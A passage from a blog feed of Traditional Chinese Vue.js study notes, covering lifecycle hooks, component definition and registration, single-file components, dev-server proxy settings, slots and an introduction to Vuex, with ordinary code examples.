class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>備註：</p>
<ol>
<li>指令定義時不加<code>v-</code>，但使用時要加<code>v-</code>:</li>
<li>指令名如果是多個單詞，要使用 kebab-case 命名方式，不要用 camelCase 命名方式</li>
</ol>
</li>
</ol>
<h2 id="生命週期"><a href="#生命週期" class="headerlink" title="生命週期"></a>生命週期</h2><ol>
<li><p>簡介：</p>
<ul>
<li>Vue在關鍵時刻幫我們調用的一些特殊名稱的函數</li>
<li>生命週期函數的名字不可更改，但函數的具體內容是程序員根據要求編寫的</li>
<li>生命週期函數中的<code>this</code>指向是<code>vm</code>或組件實例對象</li>
<li>生命週期：<code>beforeCreate</code> -&gt; <code>created</code> -&gt; <code>beforeMount</code>  -&gt; <code>mounted</code>  -&gt; <code>beforeUpdated</code>  -&gt; <code>updated</code>  -&gt; <code>beforeDestoryed</code>  -&gt; <code>destoryed</code></li>
<li>圖示：<img src="https://p.ipic.vip/jmyx89.png" width="600px"/></li>
</ul>
</li>
<li><p>分析聲明週期：</p>
<ol>
<li><p><code>beforeCreate()</code></p>
<ul>
<li>初始化：生命週期、事件</li>
<li>無法通過<code>vm</code>訪問<code>data</code>中的數據和<code>methods</code>中的方法</li>
</ul>
</li>
<li><p><code>created()</code></p>
<ul>
<li>初始化：數據監聽、數據代理</li>
<li>可以通過<code>vm</code>訪問<code>data</code>中的數據和<code>methods</code>中的方法</li>
</ul>
</li>
<li><p><code>beforeMount()</code></p>
<ul>
<li>解析模板，生成虛擬DOM，此時頁面還<font color="#f54747">不能顯示解析好的內容</font></li>
<li>頁面呈現的是<font color="#f54747">未經Vue編譯的DOM結構</font></li>
<li>所有對DOM的操作，最終都沒有效果</li>
</ul>
</li>
<li><p><code>mounted()</code></p>
<ul>
<li>將內存中的 虛擬DOM 轉為 真實DOM 插入頁面</li>
<li>頁面呈現的是<font color="#f54747">經過Vue編譯的DOM結構</font></li>
<li>一般在此進行：開始定時器、發送網絡請求、綁定自定義事件等初始化操作</li>
</ul>
</li>
<li><p><code>beforeUpdate()</code></p>
<ul>
<li>此時數據是新的，但是頁面是舊的，<font color="#f54747">數據和頁面尚未保持同步</font></li>
</ul>
</li>
<li><p><code>updated()</code></p>
<ul>
<li>根據新數據生成新的虛擬DOM，隨後與舊的虛擬DOM進行<code>diff</code>算法比較，最終更新頁面</li>
<li>此時數據和頁面都是新的，<font color="#f54747">數據和頁面同步</font></li>
</ul>
</li>
<li><p><code>beforeDestroyed()</code></p>
<ul>
<li>此時<code>vm</code>中的所有<code>data</code>、<code>methods</code>都是可用的，但<font color="#f54747">不會進行頁面的更新</font></li>
<li>一般在此進行：關閉定時器等收尾操作</li>
</ul>
</li>
<li><p><code>destroyed()</code></p>
<ul>
<li>刪除所有內置的數據監聽和數據代理</li>
</ul>
</li>
</ol>
</li>
<li><p>常用生命週期鉤子：</p>
<ol>
<li><code>mounted()</code> <ul>
<li>發送<code>ajax</code>請求、啟動定時器、綁定自定義事件、訂閱消息等<font color="#f54747">初始化操作</font></li>
</ul>
</li>
<li><code>beforeDestroy()</code><ul>
<li>清除定時器、解綁自定義事件、取消訂閱信息等<font color="#f54747">收尾工作</font></li>
</ul>
</li>
</ol>
</li>
<li><p>關於銷毀Vue實例：</p>
<ol>
<li>銷毀後借助Vue的開發者工具看不到任何信息</li>
<li>銷毀後自定義事件會失效，但<font color="#f54747">原生DOM事件依然有效</font></li>
<li>一般不會在<code>beforeDestroy</code>操作數據，因為即便操作數據，也不會觸發更新流程</li>
</ol>
</li>
</ol>
<h2 id="組件化編程"><a href="#組件化編程" class="headerlink" title="組件化編程"></a>組件化編程</h2><ol>
<li><p>傳統方式編寫應用：</p>
<ol>
<li><p>案例一、頂部、導航、內容、底部</p>
<ul>
<li>結構：<ul>
<li>1個HTML，負責頁面結構</li>
<li>添加引入4個CSS，負責管理不同區域</li>
<li>添加引入4個JS，負責各個區域的交互</li>
</ul>
</li>
</ul>
</li>
<li><p>案例二、頂部、商品列表、底部</p>
<ul>
<li>結構：<ul>
<li>1個新的HTML，「複製貼上」案例一中 頂部與底部的結構，並添加商品列表的結構</li>
<li>引入案例一中重複的頂部與底部CSS樣式</li>
<li>引入案例一中重複的頂部與底部JS</li>
<li>添加引入1個CSS樣式和JS交互，負責商品列表區域</li>
</ul>
</li>
</ul>
</li>
<li><p>存在問題：</p>
<ol>
<li>依賴關係混亂、不好維護</li>
<li>代碼複用率不高</li>
</ol>
</li>
</ol>
</li>
<li><p>組件方式編寫應用：</p>
<ol>
<li><p>案例一、頂部、導航、內容、底部</p>
<ul>
<li>分開四個不同組件：<ul>
<li><code>header</code>組件，包含：實現頂部功能所對應的樣式(CSS)、結構(HTML片斷)及交互(JS)</li>
<li><code>navigator</code>組件</li>
<li><code>content</code>組件</li>
<li><code>footer</code>組件</li>
</ul>
</li>
</ul>
</li>
<li><p>案例二、頂部、商品列表、底部</p>
<ul>
<li>把重複應用的組件引入</li>
<li>再新增<code>list</code>組件，裏面包含實現其功能的樣式、結構及交互，並且包含獨特的，如字體、音頻等</li>
</ul>
</li>
</ol>
</li>
<li><p>組件化編程思路：</p>
<ol>
<li><p>拆分靜態組件：組件按照<font color="#f54747">功能點</font>拆分，命名不要與html元素衝突</p>
</li>
<li><p>實現動態組件：考慮好數據存放的位置，數據是一個組件在用，還是一些組件在用：</p>
<ul>
<li>一個組件在用：放在組件自身即可</li>
<li>多個組件在用：放在他們共同父組件上（狀態提升）</li>
</ul>
</li>
<li><p>實現交互：從綁定事件開始</p>
</li>
</ol>
</li>
<li><p>組件與模塊：</p>
<ol>
<li><p>模塊</p>
<ul>
<li>定義：向外提供特定功能的JS程序</li>
<li>原因：JS文件很多很複雜</li>
<li>作用：複用JS、簡化JS編程，提高JS運行效率</li>
</ul>
</li>
<li><p>組件</p>
<ul>
<li>定義：實現應用中<font color="#f54747">局部功能代碼和資源的集合</font></li>
<li>原因：一個界面的功能很複雜</li>
<li>作用：複寫編碼、簡化項目編碼，提高運行效率</li>
</ul>
</li>
</ol>
</li>
<li><p>組件化與模塊化</p>
<ol>
<li><p>模塊化</p>
<ul>
<li>當應用中的JS以模塊化形式編寫的，那這個應用就是一個模塊化的應用（把JS按模塊化的標準拆分）</li>
</ul>
</li>
<li><p>組件化</p>
<ul>
<li>當應用中的功能都是多組件的方式來編寫的，那這個應用就是一個組件化的應用（按照不同功能點來拆分）</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="非單文件組件"><a href="#非單文件組件" class="headerlink" title="非單文件組件"></a>非單文件組件</h2><ol>
<li><p>Vue中使用組件的三大步驟：</p>
<ol>
<li><p>定義一個組件：</p>
<ul>
<li>使用<code>Vue.extend(options)</code>創建<ul>
<li><code>options</code>和<code>new Vue(options)</code>時傳入的那個<code>options</code>幾乎一樣</li>
<li>區別：<ol>
<li><code>el</code>不要寫，因為最終所有組件都要經過一個<code>vm</code>管理，由<code>vm</code>中的<code>el</code>決定服務哪個容器</li>
<li><code>data</code>必須寫成函數<code>data()&#123;return&#123;&#125;&#125;</code>，避免組件被複用時數據存在引用關係（儲存為同一地址）</li>
</ol>
</li>
<li>備註：使用<code>template</code>可以配置組件結構  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Student Name: &#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Student Address: &#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">studentName</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="number">19</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>註冊組件：</p>
<ol>
<li><p>局部註冊：靠<code>new Vue</code>的時候傳入<code>components</code>選項</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        school,</span><br><span class="line">        student</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>全局註冊：靠<code>Vue.component(&#39;組件名&#39;, 組件)</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;school&#x27;</span>, school)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>使用組件（組件標籤）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;組件名&gt;&lt;/組件名&gt;</span><br><span class="line">&lt;school&gt;&lt;/school&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>使用組件注意事項</p>
<ol>
<li><p>組件命名方式：</p>
<ol>
<li><p>一個單詞組成：</p>
<ul>
<li>第一種寫法：首字母大寫<code>School</code></li>
<li>第二種寫法：首字母小寫<code>school</code></li>
</ul>
</li>
<li><p>多個單詞組成：</p>
<ul>
<li>第一種寫法：kebab-case命名<code>my-school</code></li>
<li>第二種寫法：CamelCase命名<code>MySchool</code>（需要Vue腳手架支持）</li>
</ul>
</li>
<li><p>備註：</p>
<ul>
<li>組件名儘可能迴避HTML中已有的元素名稱，例如<code>h2</code>、<code>H2</code></li>
<li>可以使用<code>name</code>配置項指定組件在開發者工具中呈現的名字</li>
</ul>
</li>
</ol>
</li>
<li><p>組件標籤寫法：<br> a. <code>&lt;school&gt;&lt;/school&gt;</code><br> b. <code>&lt;school/&gt;</code>    (不使用腳手架時，<code>&lt;school/&gt;</code>標籤會導致後續組件不能渲染)</p>
</li>
<li><p>簡寫方式：<br> <code>const school = Vue.extend(options)</code>可簡寫為<code>const school = options</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;School Name: &#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;School Address: &#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            <span class="attr">schoolName</span>:<span class="string">&#x27;CUHK&#x27;</span>,</span><br><span class="line">            <span class="attr">address</span>:<span class="string">&#x27;Tai Po&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>組件嵌套</p>
<ul>
<li>在組件內傳入<code>components</code>選項  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定義 student 組件</span></span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;Student&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定義 school 組件</span></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;student&gt;&lt;/student&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        student</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定義 app 組件</span></span><br><span class="line"><span class="keyword">const</span> app = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        school,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;app&gt;&lt;/app&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="comment">// 註冊組件(局部)</span></span><br><span class="line">    <span class="attr">components</span>:&#123;app&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>VueComponent</code></p>
<ol>
<li><p><code>school</code>組件本質是一個名為<code>VueComponent</code>的<font color="#f54747">構造函數</font>，且不是程序員定義的，是<code>Vue.extend</code>生成的</p>
</li>
<li><p>我們只需要寫<code>&lt;school&gt;&lt;/school&gt;</code>，Vue解析時會幫我們創建<code>school</code>組件的實例對象</p>
<ul>
<li>即Vue會幫我們執行：<code>new VueComponent(options)</code></li>
</ul>
</li>
<li><p>特別注意：<font color="#f54747">每次調用<code>Vue.extend</code>時，返回的都是一個全新的<code>VueComponent</code>！！！</font></p>
</li>
<li><p><code>this</code>指向：</p>
<ul>
<li><p>組件配置中：</p>
<ul>
<li><code>data</code>函數、<code>methods</code>中的函數、<code>watch</code>中的函數、<code>computed</code>中的函數<br>  他們的<code>this</code>都是<font color="#f54747">VueComponent實例對象</font></li>
</ul>
</li>
<li><p><code>new Vue(options)</code>配置中：</p>
<ul>
<li><code>data</code>函數、<code>methods</code>中的函數、<code>watch</code>中的函數、<code>computed</code>中的函數<br>  他們的<code>this</code>都是<font color="#f54747">Vue實例對象 &#x3D;&#x3D;&#x3D; vm</font></li>
</ul>
</li>
</ul>
</li>
<li><p><code>VueComponent</code>的實例對象，簡稱<code>vc</code>。Vue的實例對象，簡稱<code>vm</code></p>
</li>
</ol>
</li>
<li><p>內置關係：</p>
<ul>
<li>一個重要的內置關係：<code>VueComponent.prototype.__proto__ === Vue.prototype</code></li>
<li>原因：讓組件實例對象(vc)，也能訪問到Vue原型上的屬性和方法</li>
</ul>
</li>
</ol>
<h2 id="單文件組件"><a href="#單文件組件" class="headerlink" title="單文件組件"></a>單文件組件</h2><ol>
<li><p>創建<code>index.html</code>文件</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入Vue.js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue_basic/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入入口文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>配置<code>main.js</code>入口文件</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`&lt;App&gt;&lt;/App&gt;`</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;<span class="title class_">App</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>配置<code>App</code>組件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;School/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 引入組件</span><br><span class="line">    import School from &#x27;./School.vue&#x27;</span><br><span class="line"></span><br><span class="line">    // 暴露App組件</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;App&#x27;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            School,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>配置<code>School</code>組件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 組件的結構 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">        &lt;h2&gt;School Name: &#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">        &lt;button @click=&quot;showName&quot;&gt;Show Name&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 組件交互相關的代碼 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;School&#x27;,</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                name:&#x27;CUHK&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            showName()&#123;</span><br><span class="line">                alert(this.name)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 組件的樣式 --&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>注意：此時開啟<code>index.html</code>文件頁面沒有任何小效果，因為沒有配置Vue腳手架</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - AJAX</title>
    <url>/myBlog/2022/06/20/2022/FrontEnd/2022-6-20-VueJS-ajax/</url>
    <content><![CDATA[<h1 id="Vue-AJAX"><a href="#Vue-AJAX" class="headerlink" title="Vue AJAX"></a>Vue AJAX</h1><h2 id="Vue腳手架配置代理"><a href="#Vue腳手架配置代理" class="headerlink" title="Vue腳手架配置代理"></a>Vue腳手架配置代理</h2><ol>
<li><p>方法一：在<code>vue.config.js</code>中添加如下配置</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: <span class="string">&#x27;http://localhost:5001&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<ul>
<li>優點：配置簡單，請求資源時直接發給前端(8080)即可</li>
<li>缺點：不能配置多個代理，不能靈活的控制請求是否走代理</li>
<li>工作方式：若按照上述配置代理，當請求了前端不存在的資源時，那麼該請求會轉發給服務器（優先匹配前端資源）</li>
</ul>
</li>
<li><p>方法二：編寫<code>vue.config.js</code>配置具體代理規則</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/api1&#x27;</span>: &#123;      <span class="comment">// 匹配所有以 &#x27;/api1&#x27; 開頭的請求路徑</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5001&#x27;</span>,    <span class="comment">// 代理目標的基礎路徑</span></span><br><span class="line">            <span class="attr">pathRewrite</span>:&#123;<span class="string">&#x27;^/api1&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;,  </span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;/api2&#x27;</span>: &#123;      <span class="comment">// 匹配所有以 &#x27;/api2&#x27; 開頭的請求路徑</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5002&#x27;</span>,    <span class="comment">// 代理目標的基礎路徑</span></span><br><span class="line">            <span class="attr">pathRewrite</span>:&#123;<span class="string">&#x27;^/api2&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;,</span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    changeOrigin設置為true時，服務器收到的請求頭中的host為：localhost:5001</span></span><br><span class="line"><span class="comment">    changeOrigin設置為false時，服務器收到的請求頭中的host為：localhost:8080</span></span><br><span class="line"><span class="comment">    changeOrigin默認值為true</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<ul>
<li>優點：可以配置多個代理，而且可以靈活的控制請求是否要走代理</li>
<li>缺點：配置略微繁瑣，請求資源時必須加前綴</li>
</ul>
</li>
</ol>
<h2 id="插槽slot"><a href="#插槽slot" class="headerlink" title="插槽slot"></a>插槽slot</h2><ol>
<li><p>作用：</p>
<ol>
<li>默認插槽、具名插槽：讓父組件可以向子組件指定位置插入html結構</li>
<li>作用域插槽：可以是一種通信方式，適用於父組件 -&gt; 子組件</li>
</ol>
</li>
<li><p>默認插槽：</p>
<ul>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;div&gt; HTML結構 &lt;/div&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 定義插槽 --&gt;</span><br><span class="line">        &lt;slot&gt; 插槽默認內容 &lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>具名插槽：</p>
<ul>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;!-- 方式一 --&gt;</span><br><span class="line">        &lt;template slot=&quot;slotName1&quot;&gt;</span><br><span class="line">            &lt;div&gt; HTML結構1 &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">        &lt;!-- 方式二 --&gt;</span><br><span class="line">        &lt;template v-slot:slotName2&gt;</span><br><span class="line">            &lt;div&gt; HTML結構2 &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 定義插槽 --&gt;</span><br><span class="line">        &lt;slot name=&quot;slotName1&quot;&gt; 插槽默認內容 &lt;/slot&gt;</span><br><span class="line">        &lt;slot name=&quot;slotName2&quot;&gt; 插槽默認內容 &lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>作用域插槽</p>
<ul>
<li><p>理解：<font color="#f54747">當數據在組件的自身<font color="green">(子組件)</font>，但根據數據生成的結構需要組件的使用者<font color="green">(父組件)</font>來決定</font></p>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">            &lt;!-- 生成ul列表 --&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li v-for=&quot;(item,index) in scopeData.games&quot; :key=&quot;index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">            &lt;!-- 生成h4標題 --&gt;</span><br><span class="line">            &lt;h4 v-for=&quot;(item,index) in scopeData.games&quot; :key=&quot;index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/h4&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;Category&#x27;,</span><br><span class="line">        props:[&#x27;title&#x27;],</span><br><span class="line">        // 數據在子組件中</span><br><span class="line">        data()&#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                games:[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ,&#x27;d&#x27;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vuex</title>
    <url>/myBlog/2022/06/25/2022/FrontEnd/2022-6-25-VueJS-Vuex/</url>
    <content><![CDATA[<h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><h2 id="Vuex簡介"><a href="#Vuex簡介" class="headerlink" title="Vuex簡介"></a>Vuex簡介</h2><ol>
<li><p>概念：<br> 專門在Vue中實現<font color="#f54747">集中式數據(狀態)管理</font>的一個Vue插件，對Vue應用中多個組件的共享數據(狀態)進行集中式的管理(讀&#x2F;寫)，也是一種組件間通信的方式，適用於任意組件中的通信</p>
</li>
<li><p>什麼時候使用Vuex<br> a. 多個組件依賴於同一數據<br> b. 來自不同組件的行為需要變更同一數據</p>
</li>
</ol>
<h2 id="Vue工作原理"><a href="#Vue工作原理" class="headerlink" title="Vue工作原理"></a>Vue工作原理</h2><img src="https://p.ipic.vip/6sd35u.png" alt="vuex"/>

<ol>
<li><p><code>Vue Components</code>：組件，發送操作</p>
<ul>
<li>通過調用<code>dispatch()</code>方法向Vuex傳遞要執行的操作  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、要進行的操作</span></span><br><span class="line"><span class="comment">// 參數二、操作所需的數據</span></span><br><span class="line"><span class="title function_">dispatch</span>(<span class="string">&#x27;add&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Actions</code>：一個對象，用於保存動作、行為</p>
<ul>
<li>裏面存有操作所對應的 <font color="skyblue">方法</font><code>add:function()&#123;...&#125;</code></li>
<li>在函數裡調用<code>commit()</code>方法向Mutations傳遞數據  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、要進行的操作</span></span><br><span class="line"><span class="comment">// 參數二、操作所需的數據</span></span><br><span class="line"><span class="title function_">commit</span>(<span class="string">&#x27;add&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Mutations</code>：一個對象，用於修改、更新數據</p>
<ul>
